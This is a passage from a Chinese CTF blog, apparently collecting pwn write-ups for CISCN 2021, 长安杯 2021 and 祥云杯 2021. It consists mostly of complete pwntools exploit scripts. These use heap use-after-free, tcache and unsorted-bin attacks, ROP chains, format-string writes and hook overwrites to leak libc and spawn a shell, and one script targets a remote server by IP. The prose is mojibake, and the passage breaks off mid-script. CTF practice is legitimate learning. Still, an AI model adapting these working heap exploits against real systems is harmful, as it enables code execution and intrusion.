class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook^key))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(system^key))</span><br><span class="line">add(<span class="number">0x60</span>,p64(binsh^key))</span><br><span class="line">free(<span class="number">5</span>) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2021-PWN4"><a class="header-anchor" href="#CISCN-2021-PWN4">Â¶</a>[CISCN 2021]PWN4</h2>
<h3 id="é¢˜ç›®è§£æ"><a class="header-anchor" href="#é¢˜ç›®è§£æ">Â¶</a>é¢˜ç›®è§£æ</h3>
<p>å…·ä½“è§æˆ‘å‰é¢UAFçš„æ–‡ç« </p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line">payload1 = p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)+p64(bin_sh)+p64(<span class="number">0</span>)+p64(rop2)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">56</span>+p64(main)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&quot;yes\x00\x00\x00\x00\x00&quot;</span> + payload1</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4))</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi) + p64(bin_sh) + p64(system_addr) + p64(main)</span><br><span class="line">payload2 = <span class="string">b&#x27;yes&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + payload2</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Are you sure?:&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="é•¿å®‰æ¯-2021å­¦ç”Ÿç»„-baige"><a class="header-anchor" href="#é•¿å®‰æ¯-2021å­¦ç”Ÿç»„-baige">Â¶</a>[é•¿å®‰æ¯ 2021å­¦ç”Ÿç»„]baige</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v4"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v4">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.unsorted bin attact 
2.é€»è¾‘æ¼æ´
</code></pre>
<h3 id="IDA-åˆ†æ-v2"><a class="header-anchor" href="#IDA-åˆ†æ-v2">Â¶</a>IDA åˆ†æ</h3>
<p>æœ¬é¢˜åŠŸèƒ½add,show,edit,deleteä¸€åº”ä¿±å…¨</p>
<p>æ¼æ´ç‚¹åœ¨addå‡½æ•°ä¸­</p>
<p><img src="http://static.zybuluo.com/hgggg/hp8iw26kpnaymkagp0xsst0w/6.png" alt="6.png-37.4kB"></p>
<p>add å‡½æ•°ç”¨ä¸€ä¸ªæ•°ç»„æ¥å‚¨å­˜sizeï¼Œ<strong>è€Œä¸”åœ¨è¿›å…¥æ£€æŸ¥ä¹‹å‰å°±ä¼šå¯¹æ•°ç»„ä¸­çš„å€¼èµ‹å€¼</strong>ï¼Œè¿™å°±æ„å‘³ç€æˆ‘å¯ä»¥åˆ©ç”¨è¿™ç‚¹æ¥ä¿®æ”¹å·²ç»ç”³è¯·åˆ°çš„å †å—çš„å¤§å°é€ æˆå †æº¢å‡º</p>
<h3 id="è§£é¢˜æ€è·¯"><a class="header-anchor" href="#è§£é¢˜æ€è·¯">Â¶</a>è§£é¢˜æ€è·¯</h3>
<p>Step1: leak libc<br>
æœ¬é¢˜é¢˜ç›®ç¯å¢ƒä½2.27éœ€è¦å¡«æ»¡tacahe,æ¥Unsorted bin attack</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)  <span class="comment">#é˜²æ­¢åˆå¹¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br></pre></td></tr></table></figure>
<p>Step2: åˆ©ç”¨é€»è¾‘æ¼æ´åˆ¶é€ å †æº¢å‡ºï¼Œæ‰“free_hookæ¥getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
<h3 id="exp-v8"><a class="header-anchor" href="#exp-v8">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;fff&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content?&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa\n&#x27;</span>)</span><br><span class="line">libc_base = (u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">8</span>) -<span class="number">0x3ebd00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook =  libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;100000&quot;</span>)</span><br><span class="line">payload= p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x18</span>,p64(system))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-ç¥¥äº‘æ¯-note"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-note">Â¶</a>[2021 ç¥¥äº‘æ¯]note</h2>
<h3 id="é¢˜ç›®åˆ†æ-v2"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v2">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>å…·ä½“åˆ†æè§æˆ‘house of orange é‚£ç¯‡ç¬”è®°</p>
<h3 id="exp-v9"><a class="header-anchor" href="#exp-v9">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;ggg&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28009</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  p.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">content1,content2</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">  p.send(content1)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">  p.sendline(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;addr: &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">top_chunk = heap_addr + <span class="number">0x30</span></span><br><span class="line">top_size = top_chunk + <span class="number">8</span></span><br><span class="line">say(<span class="string">b&#x27;%7$daaaa&#x27;</span>+p64(top_size),<span class="built_in">str</span>(<span class="number">0xfc1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4c28</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">one = libc_base + one_gadgets[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">say(<span class="string">b&#x27;%7$saaaa&#x27;</span>+p64(malloc_hook-<span class="number">8</span>),p64(one)+p64(realloc+<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-ç¥¥äº‘æ¯-PasswordBox-ProVersion"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-PasswordBox-ProVersion">Â¶</a>[2021 ç¥¥äº‘æ¯]PasswordBox ProVersion</h2>
<h3 id="é¢˜ç›®åˆ†æ-v3"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v3">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>åŠŸèƒ½ä¸FreeVersion ç›¸ä¼¼ï¼Œå¤šäº†å®Œæ•´çš„editå’Œshow,ä»¥åŠä¸€ä¸ªrecoverå¯ä»¥æ¢å¤è¢«é‡Šæ”¾æ‰çš„å †å—</p>
<p>ä½†æ˜¯é¢˜ç›®æ‰€ç»™çš„libcç‰ˆæœ¬ä½2.31ï¼Œä¸”ç¨‹åºèƒ½å¤Ÿæ˜¾å¼çš„æ‰§è¡Œexitå‡½æ•°ï¼Œè¿™å°±æƒ³åˆ°äº†ha1vkå¸ˆå‚…æå‡ºçš„é«˜ç‰ˆæœ¬glibcçš„åˆ©ç”¨æ–¹å¼ï¼Œhouse of banana(é“¾æ¥ï¼šâ€œ<a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a>â€)</p>
<p>ç„¶åå°±æ˜¯ä¸€æ³¢ä¾è‘«èŠ¦ç”»ç“¢</p>
<h3 id="EXP-v3"><a class="header-anchor" href="#EXP-v3">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;pwdPro&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwdPro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Add&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Save:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Pwd&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Edit:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Check:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Delete:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Recover&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;ID:&quot;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x428</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x420</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x600</span>) <span class="comment">#5</span></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">libc_addr = (u64(p.recv(<span class="number">8</span>))^key) </span><br><span class="line">libc_base = libc_addr -<span class="number">0x1ec010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rtl_global = libc_base + <span class="number">0x1f4000</span> + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x3D</span></span><br><span class="line">ret = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x14E</span></span><br><span class="line">pop_rdi_rbp_ret = libc_base + <span class="number">0x00000000000276e9</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x1b75aa</span></span><br><span class="line">system_addr =  libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span 